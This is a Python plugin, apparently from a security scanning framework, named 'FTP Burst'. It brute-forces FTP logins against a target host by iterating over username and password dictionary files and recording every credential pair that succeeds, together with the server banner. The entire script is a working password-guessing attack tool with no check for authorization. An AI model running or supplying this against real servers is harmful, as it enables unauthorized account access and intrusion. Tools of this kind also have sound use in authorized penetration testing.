#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'orleven'



def get_script_info(data=None):
    script_info = {
        "name": "FTP Burst",
        "info": "This is a test.",
        "level": "low",
        "type": "info",
        "author": "orleven",
        "url": "",
        "keyword": "tag:iis",
        "source": 1
    }
    return script_info

def prove(data):
    '''
    data = {
        "target_host":"",
        "target_port":"",
        "proxy":"",
        "dic_one":"",
        "dic_two":"",
        "cookie":"",
        "url":"",
        "flag":"",
        "data":"",
        "":"",

    }

    '''

    import ftplib,socket
    socket.setdefaulttimeout(5)
    port = int(data['target_port']) if int(data['target_port']) !=0 else 21
    data['target_port'] = port
    ftp = ftplib.FTP()
    try:
        ftp.connect(data['target_host'], port)
        ftp.quit()
    except Exception as e:
        return data
    usernamedic = _read_dic(data['dic_one']) if 'dic_one' in data.keys() else  _read_dic('dict/ftp_usernames.txt')
    passworddic = _read_dic(data['dic_two']) if 'dic_two' in data.keys() else  _read_dic('dict/ftp_passwords.txt')
    anonymous = False
    for linef1 in usernamedic:
        username = linef1.strip('\r').strip('\n')

        if username == 'anonymous':
            if anonymous:
                continue
            else:
                anonymous = True
        else:
            for linef2 in passworddic:
                try:

                    password = (
                    linef2 if '%user%' not in linef2 else str(linef2).replace("%user%", str(username))).strip(
                        '\r').strip('\n')
                    ftp.connect(data['target_host'], port)
                    ftp.login(username, password)
                    data['flag'] = True
                    data['data'].append({"username":username,"password":password})
                    data['res'].append({"info":username+"/"+password,"key":ftp.getwelcome()})
                    # from lib.core.data import logger
                    # logger.info(data)
                    ftp.quit()
                except Exception as e:
                    pass
    return data


# def exec(data=None):
#     data = {}
#     data['data'] = 'This is a test.'
#     import time
#     import random
#     if random.randint(1, 10) > 10:
#         data['flag'] = True
#     else:
#         data['flag'] = False
#     return data

def _read_dic(dicname):
    with open(dicname, 'r') as f:
        return f.readlines()